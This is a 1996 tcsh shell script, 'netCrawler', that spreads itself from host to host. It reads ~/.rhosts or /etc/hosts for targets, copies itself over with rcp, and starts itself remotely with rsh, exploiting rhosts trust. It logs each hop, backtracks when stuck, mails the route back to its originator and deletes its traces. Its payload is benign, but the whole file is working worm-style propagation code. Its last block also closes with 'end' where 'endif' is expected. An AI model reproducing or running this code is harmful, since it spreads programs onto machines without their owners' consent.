#!/bin/tcsh
# netCrawler - A shell script that moves from computer to computer ( using a
# file of valid hostnames ) until it can't go any further.  Once it has reached
# the end of its journey it mails back the user its path.

# 			LUMPY '96

set VisitedHostsFile=netCrawler.hosts
# set NextHostFile=/etc/hosts
set NextHostFile=~/.rhosts
set DomainIP=143.239
set CurrentHost=`hostname | awk -F. ' NR==1 { print $1 }' `

if ( `uname` == "SunOS" ) then
 set GrepQuietSwitch=-s
else
 set GrepQuietSwitch=-q
endif

if ( ! ( -e $VisitedHostsFile ) ) then
 echo -n "netCrawler journey began: " > $VisitedHostsFile
 date >> $VisitedHostsFile
endif
echo $CurrentHost	: Here now! >> $VisitedHostsFile

# To get over duplicated file systems!
mv $0 $0.tmp
mv $VisitedHostsFile $VisitedHostsFile.tmp

# Find the next host to visit:
set LineNum=1
while ( 1 )
 if ( $NextHostFile == "/etc/hosts" ) then
  set Host=`grep $DomainIP $NextHostFile | awk ' NR=='$LineNum' { print $2 }' `
 else
  set Host=`cat $NextHostFile | awk ' NR=='$LineNum' { print $1 }' `
 endif 
 if ( $Host == "" ) break
 grep $GrepQuietSwitch $Host $VisitedHostsFile.tmp; set NotVisited=$status
 if ( $NotVisited == 1 ) then
  echo $CurrentHost	: Trying $Host >> $VisitedHostsFile.tmp
  rcp -p $0.tmp $Host\:$0 >& /dev/null
  if ( $status == 1 ) then
   echo $CurrentHost	: Couldn''t move to $Host! >> $VisitedHostsFile.tmp
  else
   rcp -p $VisitedHostsFile.tmp $Host\:$VisitedHostsFile >& /dev/null
   rm -f $0.tmp $VisitedHostsFile.tmp
   rsh -n $Host $0 >& /dev/null &
   # /bin/echo $0" &\nlogout" | rlogin $Host
   exit  
  endif
 endif 
 @ LineNum++
end

set CameFromHost=`grep "Trying $CurrentHost" $VisitedHostsFile.tmp | awk ' NR==1 { print $1 }' ` 
if ( $CameFromHost == "" ) then
 echo $CurrentHost	: Nowhere else to go! >> $VisitedHostsFile.tmp
 set OriginalHost=` cat $VisitedHostsFile.tmp | awk ' NR==2 { print $1 } ' `
 mail $USER@$OriginalHost < $VisitedHostsFile.tmp
 rm -f netCrawler.*
else
 echo $CurrentHost	: Backtracking to $CameFromHost >> $VisitedHostsFile.tmp
 rcp -p $0.tmp $CameFromHost\:$0 >& /dev/null
 rcp -p $VisitedHostsFile.tmp $CameFromHost\:$VisitedHostsFile >& /dev/null
 rm -f $0.tmp $VisitedHostsFile.tmp
 rsh -n $CameFromHost $0 >& /dev/null &
 exit
end

